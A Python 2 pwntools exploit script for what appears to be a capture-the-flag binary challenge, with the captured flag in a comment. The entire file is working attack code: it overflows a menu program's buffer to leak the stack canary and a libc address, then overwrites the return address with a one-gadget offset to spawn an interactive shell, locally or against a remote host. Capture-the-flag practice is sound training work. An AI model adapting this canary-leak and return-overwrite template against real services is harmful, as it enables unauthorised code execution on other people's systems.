#!/usr/bin/env python2

import sys
import argparse
import time
from pwn import *

# flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}
def feed(payload):
    p.sendlineafter(">>", "1")
    p.sendafter(">>", payload)

def mine():
    p.sendline("3")

def exploit():

    payload = "A" * 0xa1 + "BBBBBBBB"
    feed(payload)

    # Leak stack cookie
    p.sendlineafter(">>", "2")
    p.recvuntil("BBBBBBBB")
    cookie = u64(p8(0) + p.recv(7))
    log.info("Cookie : {}".format(hex(cookie)))

    payload = ""
    payload += "A" * 0xb0 + "BBBBBBBB"
    feed(payload)

    # Leak libc
    p.sendlineafter(">>", "2")
    p.recvuntil("BBBBBBBB")
    libc = u64(p.recv(6) + p16(0)) - 0x020830
    log.info("Libc : {}".format(hex(libc)))

    # Gadget
    gadget = libc + 0xf1117
    log.info("Gadget : {}".format(hex(gadget)))

    # Overwrite ret
    payload = ""
    payload += "A" * 0xa8
    payload += p64(cookie)
    payload += p64(0x0)
    payload += p64(gadget)
    feed(payload)

    # Trigger exploit
    mine()

    p.interactive()


if __name__ == '__main__':

    # Argument parser
    parser = argparse.ArgumentParser(description='Exploit Dev Template')
    parser.add_argument('binary', help="Binary to exploit")
    parser.add_argument('-e', '--env', choices=['local', 'remote'],
                        help='Default : local',
                        default='local')

    parser.add_argument('-i', help="remote IP")
    parser.add_argument('-p', help="remote port")

    args = parser.parse_args()

    # Validate that an IP and port has been specified for remote env
    if args.env == "remote" and (args.i == None or args.p == None):
        print "%s : missing IP and/or port" % sys.argv[0]
        exit()

    # Load the binary
    try:
        binary = ELF(args.binary)
    except:
        log.warn("Issue opening %s" % args.binary)
        exit()

    try:
        libc = binary.libc
    except:
        log.warn("Libc not loaded.")

    env = args.env
    loot = {}

    if env == "local":
        p = process([args.binary], env={"LD_PRELOAD" : "./libc-2.23.so"})
        log.info(util.proc.pidof(p))

    elif env == "remote":
        p = remote(args.i, args.p)

    pause()
    exploit()
